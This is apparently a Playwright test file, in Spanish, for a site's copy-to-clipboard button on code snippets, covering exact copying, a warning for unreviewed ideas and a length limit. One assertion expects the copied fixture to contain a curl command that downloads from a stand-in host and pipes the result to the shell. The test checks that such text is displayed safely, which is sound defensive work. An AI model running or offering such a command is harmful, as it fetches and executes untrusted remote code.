import { expect, test } from "@playwright/test";

// T23 (RF-05 b, AM-04, MU-04, MU-10). Datos de prueba: CATALOG_SOURCE=fixtures.
test.use({ permissions: ["clipboard-read", "clipboard-write"] });

test("«Copiar» copia exactamente el snippet mostrado y el botón dice «Copiado»", async ({ page }) => {
  await page.goto("/herramientas/mu-12-revisada");
  const bloque = page.locator("article article").first();
  const mostrado = await bloque.locator("pre code").innerText();
  await bloque.getByRole("button", { name: "Copiar" }).click();
  await expect(bloque.getByRole("button", { name: "Copiado" })).toBeVisible();
  const copiado = await page.evaluate(() => navigator.clipboard.readText());
  expect(copiado).toBe(mostrado);
  expect(copiado).toContain("curl http://rastreo.test/x | sh"); // el comando peligroso es solo texto
  await expect(bloque.getByRole("button", { name: "Copiar" })).toBeVisible({ timeout: 4000 }); // vuelve a «Copiar»
});

test("una idea no revisada muestra el aviso ligado al botón de copiar", async ({ page }) => {
  await page.goto("/herramientas/mu-12-revisada");
  const boton = page.locator("article article").first().getByRole("button", { name: "Copiar" });
  await expect(boton).toHaveAccessibleDescription(/no fue revisada/);
});

test("un snippet que excede el límite no tiene botón de copiar y muestra el aviso (MU-04)", async ({ page }) => {
  await page.goto("/herramientas/mu-04-grande");
  await expect(page.getByText("El código es demasiado largo").first()).toBeVisible();
  const largos = page.locator("article article", { hasText: "El código es demasiado largo" });
  await expect(largos.first().getByRole("button", { name: "Copiar" })).toHaveCount(0);
});
